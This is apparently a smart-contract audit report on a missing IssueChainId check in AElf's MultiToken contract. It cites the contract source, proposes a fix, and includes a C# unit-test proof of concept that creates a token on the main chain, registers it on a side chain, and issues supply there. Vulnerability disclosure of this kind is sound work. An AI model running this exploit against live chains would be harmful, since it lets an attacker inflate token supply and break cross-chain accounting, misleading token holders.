# Audit Report

## Title
IssueChainId Manipulation Allows Unauthorized Token Issuance on Side Chains

## Summary
The `Create` method in TokenContract lacks validation that `IssueChainId` must equal the current chain ID. An attacker can create a token on the main chain with `IssueChainId` pointing to a side chain, then register it via `CrossChainCreateToken` and issue tokens directly on the side chain, bypassing side chain creation restrictions and breaking cross-chain supply accounting.

## Finding Description

The vulnerability exists in the token creation logic where `IssueChainId` validation is missing.

When creating a token, the `CreateToken` method accepts `input.IssueChainId` without validating it equals the current chain: [1](#0-0) 

This line only defaults to `Context.ChainId` when the input is 0, but accepts any other value without validation. The validation helper `AssertValidCreateInput` also does not check `IssueChainId`: [2](#0-1) 

Side chains have a protection mechanism that prevents direct token creation: [3](#0-2) 

This check blocks token creation on side chains where `State.SideChainCreator.Value` is set during initialization: [4](#0-3) 

However, an attacker can bypass this protection through the following attack path:

**Step 1 - Main Chain Token Creation**: Create a token on the main chain with `IssueChainId` set to a side chain's ID. Since `State.SideChainCreator.Value == null` on the main chain, the protection check passes.

**Step 2 - Cross-Chain Registration**: Use `CrossChainCreateToken` to register the token on the side chain: [5](#0-4) 

The side chain accepts the token with its `IssueChainId` pointing to the side chain itself (line 500).

**Step 3 - Token Issuance on Side Chain**: Call `Issue` on the side chain. The validation passes because `IssueChainId` matches the side chain's ID: [6](#0-5) 

The check at line 159 validates that `tokenInfo.IssueChainId == Context.ChainId`, which passes when the token was registered with the side chain's ID.

This breaks the security invariant that tokens should only be issued on their designated chain, and side chains should not have tokens created directly on them.

## Impact Explanation

**Circumvents Side Chain Restrictions**: The protocol explicitly prevents direct token creation on side chains to maintain security and governance control. This vulnerability allows attackers to effectively create and issue tokens on side chains through a backdoor mechanism.

**Supply Inconsistency & Cross-Chain Accounting Break**: Token supply can be inflated on side chains without corresponding main chain issuance. Since the token was created on the main chain but has `IssueChainId` pointing to the side chain, the main chain shows `Issued = 0, Supply = 0` while the side chain can issue tokens, creating irreconcilable accounting across chains. This violates the cross-chain transfer model where tokens should be burned on one chain and minted on another.

**False Legitimacy**: Tokens created through this exploit appear to have been "officially" registered via `CrossChainCreateToken` with proper merkle proof validation, giving them false legitimacy that could deceive users and applications.

**Protocol Integrity Violation**: This directly violates the cross-chain security model where a token's creation chain and issue chain should be identical. The protocol assumes these are the same for proper lock/burn logic during cross-chain transfers.

## Likelihood Explanation

**Reachable Entry Point**: The `Create` method is public and accessible to any user with token creation privileges: [7](#0-6) 

**Feasible Preconditions**:
- Attacker needs token creation access on the main chain via seed NFT purchase (standard requirement per lines 56-65)
- Side chain ID is publicly available information
- Cross-chain infrastructure is operational (standard configuration)

**Straightforward Execution**: Each step uses standard, documented contract methods (`Create`, `ValidateTokenInfoExists`, `CrossChainCreateToken`, `Issue`) with no complex timing requirements or race conditions. The attack path is deterministic and reproducible.

**Economic Rationality**: The cost (seed NFT + transaction fees) is minimal compared to the benefit (ability to issue unlimited tokens on side chains up to `TotalSupply`), making this highly profitable for malicious actors.

## Recommendation

Add validation in the `CreateToken` method to ensure `IssueChainId` equals the current chain when explicitly provided:

```csharp
// In CreateToken method, replace line 76 with:
IssueChainId = input.IssueChainId == 0 ? Context.ChainId : input.IssueChainId,

// Add validation immediately after:
Assert(tokenInfo.IssueChainId == Context.ChainId, 
    "Token can only be created with IssueChainId matching current chain.");
```

Alternatively, always force `IssueChainId` to equal `Context.ChainId` during token creation:

```csharp
IssueChainId = Context.ChainId,  // Ignore input.IssueChainId completely
```

## Proof of Concept

```csharp
[Fact]
public async Task IssueChainId_Manipulation_Attack_Test()
{
    // Setup: Generate side chain
    var sideChainId = await GenerateSideChainAsync();
    await RegisterSideChainContractAddressOnMainChainAsync();
    
    // Step 1: Create token on MAIN chain with IssueChainId = SIDE chain ID
    await CreateSeedNftCollection(TokenContractStub, DefaultAccount.Address);
    var maliciousInput = new CreateInput
    {
        Symbol = "EVIL",
        TokenName = "Evil Token",
        TotalSupply = 1000000,
        Decimals = 8,
        Issuer = DefaultAccount.Address,
        Owner = DefaultAccount.Address,
        IsBurnable = true,
        IssueChainId = sideChainId  // ATTACK: Set to side chain ID instead of main chain
    };
    await CreateSeedNftAsync(TokenContractStub, maliciousInput, TokenContractAddress);
    var createResult = await TokenContractStub.Create.SendAsync(maliciousInput);
    createResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify token created on main chain with wrong IssueChainId
    var mainChainTokenInfo = await TokenContractStub.GetTokenInfo.CallAsync(new GetTokenInfoInput { Symbol = "EVIL" });
    mainChainTokenInfo.IssueChainId.ShouldBe(sideChainId);  // Wrong chain ID!
    
    // Step 2: Register token on side chain via CrossChainCreateToken
    var tokenValidationTransaction = CreateTokenInfoValidationTransaction(mainChainTokenInfo, TokenContractStub);
    var blockExecutedSet = await MineAsync(new List<Transaction> { tokenValidationTransaction });
    var merklePath = GetTransactionMerklePathAndRoot(tokenValidationTransaction, out var blockRoot);
    await IndexMainChainTransactionAsync(blockExecutedSet.Height, blockRoot, blockRoot);
    
    var crossChainCreateResult = await SideChainTokenContractStub.CrossChainCreateToken.SendAsync(
        new CrossChainCreateTokenInput
        {
            FromChainId = MainChainId,
            ParentChainHeight = blockExecutedSet.Height,
            TransactionBytes = tokenValidationTransaction.ToByteString(),
            MerklePath = merklePath
        });
    crossChainCreateResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Step 3: Issue tokens on SIDE chain (should fail but doesn't due to vulnerability)
    var issueResult = await SideChainTokenContractStub.Issue.SendAsync(new IssueInput
    {
        Symbol = "EVIL",
        Amount = 100000,
        To = SideChainTestKit.DefaultAccount.Address,
        Memo = "Exploit"
    });
    
    // VULNERABILITY: Issue succeeds on side chain because IssueChainId matches
    issueResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify supply inconsistency
    var sideChainTokenInfo = await SideChainTokenContractStub.GetTokenInfo.CallAsync(new GetTokenInfoInput { Symbol = "EVIL" });
    sideChainTokenInfo.Supply.ShouldBe(100000);  // Side chain has supply
    mainChainTokenInfo = await TokenContractStub.GetTokenInfo.CallAsync(new GetTokenInfoInput { Symbol = "EVIL" });
    mainChainTokenInfo.Supply.ShouldBe(0);  // Main chain still shows 0 - BROKEN ACCOUNTING!
}
```

### Citations

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L14-26)
```csharp
    public override Empty InitializeFromParentChain(InitializeFromParentChainInput input)
    {
        Assert(!State.InitializedFromParentChain.Value, "MultiToken has been initialized");
        State.InitializedFromParentChain.Value = true;
        Assert(input.Creator != null, "creator should not be null");
        foreach (var pair in input.ResourceAmount) State.ResourceAmount[pair.Key] = pair.Value;

        foreach (var pair in input.RegisteredOtherTokenContractAddresses)
            State.CrossChainTransferWhiteList[pair.Key] = pair.Value;

        SetSideChainCreator(input.Creator);
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L33-46)
```csharp
    public override Empty Create(CreateInput input)
    {
        var inputSymbolType = GetSymbolType(input.Symbol);
        if (input.Owner == null)
        {
            input.Owner = input.Issuer;
        }
        return inputSymbolType switch
        {
            SymbolType.NftCollection => CreateNFTCollection(input),
            SymbolType.Nft => CreateNFTInfo(input),
            _ => CreateToken(input)
        };
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L53-55)
```csharp
            // can not call create on side chain
            Assert(State.SideChainCreator.Value == null,
                "Failed to create token if side chain creator already set.");
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L76-76)
```csharp
            IssueChainId = input.IssueChainId == 0 ? Context.ChainId : input.IssueChainId,
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L154-178)
```csharp
    public override Empty Issue(IssueInput input)
    {
        Assert(input.To != null, "To address not filled.");
        AssertValidMemo(input.Memo);
        var tokenInfo = AssertValidToken(input.Symbol, input.Amount);
        Assert(tokenInfo.IssueChainId == Context.ChainId, "Unable to issue token with wrong chainId.");
        Assert(tokenInfo.Issuer == Context.Sender || Context.Sender == Context.GetZeroSmartContractAddress(),
            $"Sender is not allowed to issue token {input.Symbol}.");

        tokenInfo.Issued = tokenInfo.Issued.Add(input.Amount);
        tokenInfo.Supply = tokenInfo.Supply.Add(input.Amount);

        Assert(tokenInfo.Issued <= tokenInfo.TotalSupply, "Total supply exceeded");
        SetTokenInfo(tokenInfo);
        ModifyBalance(input.To, input.Symbol, input.Amount);

        Context.Fire(new Issued
        {
            Symbol = input.Symbol,
            Amount = input.Amount,
            To = input.To,
            Memo = input.Memo
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L478-534)
```csharp
    public override Empty CrossChainCreateToken(CrossChainCreateTokenInput input)
    {
        var tokenContractAddress = State.CrossChainTransferWhiteList[input.FromChainId];
        Assert(tokenContractAddress != null,
            $"Token contract address of chain {ChainHelper.ConvertChainIdToBase58(input.FromChainId)} not registered.");

        var originalTransaction = Transaction.Parser.ParseFrom(input.TransactionBytes);

        AssertCrossChainTransaction(originalTransaction, tokenContractAddress, nameof(ValidateTokenInfoExists));
        var originalTransactionId = originalTransaction.GetHash();
        CrossChainVerify(originalTransactionId, input.ParentChainHeight, input.FromChainId, input.MerklePath);
        var validateTokenInfoExistsInput =
            ValidateTokenInfoExistsInput.Parser.ParseFrom(originalTransaction.Params);
        AssertNftCollectionExist(validateTokenInfoExistsInput.Symbol);
        var tokenInfo = new TokenInfo
        {
            Symbol = validateTokenInfoExistsInput.Symbol,
            TokenName = validateTokenInfoExistsInput.TokenName,
            TotalSupply = validateTokenInfoExistsInput.TotalSupply,
            Decimals = validateTokenInfoExistsInput.Decimals,
            Issuer = validateTokenInfoExistsInput.Issuer,
            IsBurnable = validateTokenInfoExistsInput.IsBurnable,
            IssueChainId = validateTokenInfoExistsInput.IssueChainId,
            ExternalInfo = new ExternalInfo { Value = { validateTokenInfoExistsInput.ExternalInfo } },
            Owner = validateTokenInfoExistsInput.Owner ?? validateTokenInfoExistsInput.Issuer
        };

        var isSymbolAliasSet = SyncSymbolAliasFromTokenInfo(tokenInfo);
        if (State.TokenInfos[tokenInfo.Symbol] == null)
        {
            RegisterTokenInfo(tokenInfo);
            Context.Fire(new TokenCreated
            {
                Symbol = validateTokenInfoExistsInput.Symbol,
                TokenName = validateTokenInfoExistsInput.TokenName,
                TotalSupply = validateTokenInfoExistsInput.TotalSupply,
                Decimals = validateTokenInfoExistsInput.Decimals,
                Issuer = validateTokenInfoExistsInput.Issuer,
                IsBurnable = validateTokenInfoExistsInput.IsBurnable,
                IssueChainId = validateTokenInfoExistsInput.IssueChainId,
                ExternalInfo = new ExternalInfo { Value = { validateTokenInfoExistsInput.ExternalInfo } },
                Owner = tokenInfo.Owner,
            });
        }
        else
        {
            if (isSymbolAliasSet &&
                validateTokenInfoExistsInput.ExternalInfo.TryGetValue(TokenContractConstants.TokenAliasExternalInfoKey,
                    out var tokenAliasSetting))
            {
                State.TokenInfos[tokenInfo.Symbol].ExternalInfo.Value
                    .Add(TokenContractConstants.TokenAliasExternalInfoKey, tokenAliasSetting);
            }
        }

        return new Empty();
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L272-283)
```csharp
    private void AssertValidCreateInput(CreateInput input, SymbolType symbolType)
    {
        Assert(input.TokenName.Length <= TokenContractConstants.TokenNameLength
               && input.Symbol.Length > 0
               && input.Decimals >= 0
               && input.Decimals <= TokenContractConstants.MaxDecimals, "Invalid input.");

        CheckSymbolLength(input.Symbol, symbolType);
        if (symbolType == SymbolType.Nft) return;
        CheckTokenAndCollectionExists(input.Symbol);
        if (IsAddressInCreateWhiteList(Context.Sender)) CheckSymbolSeed(input.Symbol);
    }
```
